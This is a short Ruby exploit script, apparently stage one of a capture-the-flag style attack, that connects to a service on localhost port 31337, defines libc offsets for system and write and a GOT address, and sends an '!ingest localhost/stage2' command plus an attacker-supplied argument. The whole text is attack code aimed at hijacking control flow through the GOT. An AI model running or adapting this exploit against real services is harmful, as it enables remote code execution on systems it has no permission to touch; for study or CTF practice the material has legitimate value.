require 'socket'
require 'pry'

sysoffset = 0x40100
writeoffset = 0xdb530
offset = writeoffset-sysoffset
writeaddr = 0x08051140
got = 0x8050ff8

host = "localhost"
port = 31337

s = TCPSocket.open(host, port)

#-------- Stage 1 ----------
puts "[*] Sending Stage2 payload"
s.write("!ingest localhost/stage2\n")
s.write("A B C ")
sleep(0.1)
s.write(ARGV[0] + "\x00")
100.times{
a=s.recv(999)
puts a
}
